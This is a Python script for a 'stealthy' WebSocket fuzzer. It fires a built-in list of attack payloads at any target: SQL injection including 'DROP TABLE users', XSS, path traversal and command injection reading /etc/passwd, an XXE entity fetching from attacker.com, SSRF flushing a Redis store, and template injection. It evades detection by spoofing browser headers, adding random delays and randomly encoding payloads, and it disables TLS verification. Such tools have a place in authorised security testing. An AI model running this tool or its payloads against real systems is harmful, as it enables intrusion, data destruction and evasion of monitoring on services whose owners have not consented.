import asyncio
import websockets
import json
import argparse
import random
import time
import ssl
import base64
import zlib
from urllib.parse import urlparse
from typing import List, Dict, Any, Optional
import logging

# Configure logging to be less verbose
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Extended list of payloads for various vulnerability types
FUZZ_PAYLOADS = {
    "sql_injection": [
        "' OR '1'='1'--",
        "' UNION SELECT NULL, username, password FROM users--",
        "'; DROP TABLE users; --",
        "' OR SLEEP(5)--",
        "' OR 1=1 ORDER BY 5--",
        "' OR (SELECT COUNT(*) FROM sysobjects) > 0--",  # MSSQL test
        "' OR (SELECT COUNT(*) FROM all_tables) > 0--",  # Oracle test
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
    ],
    "command_injection": [
        "; ls -la",
        "| whoami",
        "`id`",
        "$(cat /etc/passwd)",
        "|| ping -c 10 127.0.0.1",
    ],
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>",
    ],
    "prototype_pollution": [
        '{"__proto__":{"isAdmin":true}}',
        '{"constructor":{"prototype":{"isAdmin":true}}}',
    ],
    "buffer_overflow": [
        "A" * 10000,
        "\x00" * 1000,
        "%n" * 100,
        "%s" * 100,
    ],
    "json_injection": [
        '{"malicious": "object"}',
        '{"$gt": ""}',
        '{"$where": "1 == 1"}',
    ],
    "ssrf": [
        "http://localhost:22",
        "http://127.0.0.1:8080/admin",
        "gopher://127.0.0.1:6379/_FLUSHALL",
        "file:///etc/passwd",
    ],
    "ssti": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
    ]
}

class WebSocketFuzzer:
    def __init__(self, uri: str, message_template: str, stealth: bool = True, 
                 delay: float = 0.1, timeout: float = 2.0, headers: Dict[str, str] = None):
        self.uri = uri
        self.message_template = message_template
        self.stealth = stealth
        self.delay = delay
        self.timeout = timeout
        self.headers = headers or {}
        self.session_id = None
        self.original_message = None
        
        # SSL context for secure connections
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def connect(self):
        """Establish WebSocket connection with optional stealth headers"""
        try:
            # Add stealth headers if enabled
            final_headers = self.headers.copy()
            if self.stealth:
                final_headers.update({
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Origin": self._get_origin_from_uri(),
                    "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
                    "Sec-WebSocket-Version": "13",
                    "Pragma": "no-cache",
                    "Cache-Control": "no-cache"
                })
            
            # Connect to WebSocket
            self.websocket = await websockets.connect(
                self.uri, 
                ssl=self.ssl_context if self.uri.startswith('wss') else None,
                extra_headers=final_headers
            )
            
            logger.info(f"[*] Connected to {self.uri}")
            
            # Get initial server response if any
            try:
                greeting = await asyncio.wait_for(self.websocket.recv(), timeout=1.0)
                logger.info(f"[<] Initial server message: {greeting}")
                # Try to extract session information if it's in JSON format
                try:
                    greeting_data = json.loads(greeting)
                    if 'sessionId' in greeting_data:
                        self.session_id = greeting_data['sessionId']
                except:
                    pass
            except asyncio.TimeoutError:
                logger.info("[-] No initial greeting from server")
            
            return True
        except Exception as e:
            logger.error(f"[!] Connection error: {e}")
            return False
    
    def _get_origin_from_uri(self):
        """Extract origin from WebSocket URI"""
        parsed = urlparse(self.uri)
        if parsed.scheme == 'wss':
            return f"https://{parsed.hostname}"
        return f"http://{parsed.hostname}"
    
    def _encode_payload(self, payload: str, encoding: str = None) -> str:
        """Encode payload using different encoding techniques"""
        if not encoding:
            # Randomly select an encoding method for stealth
            encodings = [None, 'base64', 'url', 'hex', 'zlib']
            encoding = random.choice(encodings)
        
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'url':
            from urllib.parse import quote
            return quote(payload)
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'zlib':
            compressed = zlib.compress(payload.encode())
            return base64.b64encode(compressed).decode()
        else:
            return payload
    
    def _generate_fuzzed_message(self, payload: str, payload_type: str) -> str:
        """Generate a fuzzed message based on the template"""
        encoded_payload = self._encode_payload(payload)
        
        # Handle different message formats
        if self.message_template.startswith('{') and self.message_template.endswith('}'):
            # JSON message
            try:
                message_obj = json.loads(self.message_template)
                # Recursively find and replace FUZZ_PAYLOAD in JSON structure
                self._replace_in_json(message_obj, "FUZZ_PAYLOAD", encoded_payload)
                return json.dumps(message_obj)
            except json.JSONDecodeError:
                # If template is not valid JSON, fall back to string replacement
                return self.message_template.replace("FUZZ_PAYLOAD", encoded_payload)
        else:
            # Plain text message
            return self.message_template.replace("FUZZ_PAYLOAD", encoded_payload)
    
    def _replace_in_json(self, obj: Any, search: str, replace: str):
        """Recursively replace values in JSON object"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                if isinstance(value, str) and search in value:
                    obj[key] = value.replace(search, replace)
                else:
                    self._replace_in_json(value, search, replace)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                if isinstance(item, str) and search in item:
                    obj[i] = item.replace(search, replace)
                else:
                    self._replace_in_json(item, search, replace)
    
    async def fuzz(self):
        """Main fuzzing method"""
        if not await self.connect():
            return
        
        try:
            # Get a baseline response with a normal payload
            baseline_message = self._generate_fuzzed_message("normal_test", "baseline")
            logger.info(f"[>] Sending baseline: {baseline_message}")
            await self.websocket.send(baseline_message)
            
            try:
                baseline_response = await asyncio.wait_for(self.websocket.recv(), timeout=self.timeout)
                logger.info(f"[<] Baseline response: {baseline_response}")
                self.original_message = baseline_response
            except asyncio.TimeoutError:
                logger.info("[-] No baseline response received")
            
            # Iterate through all payload categories
            for category, payloads in FUZZ_PAYLOADS.items():
                logger.info(f"[*] Testing {category} payloads")
                
                for payload in payloads:
                    if self.stealth and random.random() < 0.3:
                        # Random delay for stealth
                        await asyncio.sleep(random.uniform(0.1, 1.0))
                    
                    test_message = self._generate_fuzzed_message(payload, category)
                    logger.info(f"[>] Sending {category}: {test_message}")
                    
                    await self.websocket.send(test_message)
                    
                    # Wait for response
                    try:
                        response = await asyncio.wait_for(self.websocket.recv(), timeout=self.timeout)
                        logger.info(f"[<] Response: {response}")
                        
                        # Analyze response for potential vulnerabilities
                        self._analyze_response(response, payload, category)
                        
                    except asyncio.TimeoutError:
                        logger.info("[-] No response received for this payload")
                    
                    # Delay between requests
                    await asyncio.sleep(self.delay)
        
        except Exception as e:
            logger.error(f"[!] Fuzzing error: {e}")
        finally:
            await self.websocket.close()
            logger.info("[*] Connection closed")
    
    def _analyze_response(self, response: str, payload: str, category: str):
        """Analyze server response for potential vulnerabilities"""
        indicators = {
            "sql_injection": ["sql", "syntax", "mysql", "ora-", "postgresql", "database"],
            "xss": ["script", "alert", "onerror", "svg"],
            "path_traversal": ["etc/passwd", "root:", "boot.ini", "windows"],
            "command_injection": ["sh:", "bin", "command", "operation not permitted"],
            "xxe": ["xml", "entity", "DOCTYPE"],
            "buffer_overflow": ["segmentation", "fault", "overflow", "stack"],
            "json_injection": ["json", "parser", "token", "malformed"],
        }
        
        response_lower = response.lower()
        
        # Check for error indicators
        error_indicators = ["error", "exception", "invalid", "unexpected", "failure", "warning"]
        has_error = any(indicator in response_lower for indicator in error_indicators)
        
        # Check for category-specific indicators
        has_category_indicators = False
        if category in indicators:
            has_category_indicators = any(indicator in response_lower for indicator in indicators[category])
        
        # Check for time delays (would need async timing, implemented differently)
        
        # Compare with original response
        is_different = self.original_message and response != self.original_message
        
        if has_error or has_category_indicators or is_different:
            logger.warning(f"!!! POSSIBLE {category.upper()} VULNERABILITY WITH PAYLOAD: {payload}")
            logger.warning(f"Response: {response}")
            
            # Save finding to file
            with open("fuzz_findings.txt", "a") as f:
                f.write(f"Category: {category}\n")
                f.write(f"Payload: {payload}\n")
                f.write(f"Response: {response}\n")
                f.write("="*50 + "\n")


async def main():
    parser = argparse.ArgumentParser(description='Stealthy WebSocket Fuzzer')
    parser.add_argument('url', help='WebSocket URL (e.g., ws://echo.websocket.org)')
    parser.add_argument('--template', default='FUZZ_PAYLOAD', 
                       help='Message template. Use FUZZ_PAYLOAD as placeholder. E.g., \'{"id": 1, "data": "FUZZ_PAYLOAD"}\'')
    parser.add_argument('--no-stealth', action='store_false', dest='stealth',
                       help='Disable stealth mode (no random delays or encoding)')
    parser.add_argument('--delay', type=float, default=0.1,
                       help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('--timeout', type=float, default=2.0,
                       help='Response timeout in seconds (default: 2.0)')
    parser.add_argument('--header', action='append', 
                       help='Add custom headers (format: "Header-Name: header-value")')
    
    args = parser.parse_args()
    
    # Parse custom headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Create and run fuzzer
    fuzzer = WebSocketFuzzer(
        uri=args.url,
        message_template=args.template,
        stealth=args.stealth,
        delay=args.delay,
        timeout=args.timeout,
        headers=headers
    )
    
    await fuzzer.fuzz()


if __name__ == "__main__":
    asyncio.run(main())
